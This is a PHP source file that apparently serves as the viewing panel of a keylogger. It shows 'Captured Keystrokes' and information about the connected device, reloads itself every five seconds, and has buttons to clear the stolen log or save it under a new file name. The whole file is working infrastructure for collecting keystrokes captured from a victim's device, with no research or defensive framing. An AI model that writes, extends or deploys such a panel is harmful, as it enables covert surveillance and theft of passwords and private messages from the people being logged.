<?php
//view.php
//Logic to clear file
$logFile = 'log.txt';
if (isset($_POST['clear_log'])) {
    file_put_contents($logFile, '');
    header("Location: " . $_SERVER['PHP_SELF']); //refresh to clear form data
    exit;
}
if (isset($_POST['save_as']) && !empty($_POST['filename'])) {
    $dest = basename($_POST['filename']);
    //ensure ending in .txt
    if (strpos($dest, '.txt') === false) {
        $dest .= '.txt';
    }
    if (file_exists($logFile)) {
        copy ($logFile, $dest);
        header("Location: " . $_SERVER['PHP_SELF'] . "?saved=1");
        exit;
    }
}
?>

<h1>Captured Keystrokes</h1>
<div style="background: #f4f4f4; padding: 10px; margin-bottom: 20px; border-radius: 5px;">
    <?php
        if (file_exists('device_info.txt') && filesize('device_info.txt') > 0) {
            $info = file_get_contents('device_info.txt');
            $safe_info = str_replace(['&', '<', '>', '"', "'"], ['&amp;', '&lt;', '&gt;', '&quot;', '&#039;'], $info);
            echo "<strong>" . $safe_info . "</strong>";
        } else {
            echo "<em>Waiting for device connection...</em>";
        }
    ?>
</div>

<form method="POST" action="">
    <button type="submit" name="clear_log" onclick="return confirm('Are you sure you want to clear?');">Clear Logs</button>
</form>

<form method="POST" action="">
    <input type="text" name="filename" placeholder="Enter Desired Filename" required>
    <button type="submit" name="save_as">Save as .txt</button>
</form>

<?php
if (isset($_GET['saved'])) {
    echo "<p style='color: green;'>File saved successfully</p>";
}
?>

<hr>

<?php
echo "<pre>";
if (file_exists('log.txt')) {
    //grab file contents
    $content = file_get_contents('log.txt');
    $cleaned_content = str_replace('+', ' ', $content);
    $decoded_content = rawurldecode($cleaned_content);
    echo htmlspecialchars($cleaned_content);
} else {
    echo "No data to log or application not running";
}
echo "</pre>";
?>

<script>
var refreshTimer = setTimeout(function(){
    window.location.reload(1);
}, 5000);

document.querySelector('input[name="filename"]').addEventListener('focus', function() {
    clearTimeout(refreshTimer);
});
</script>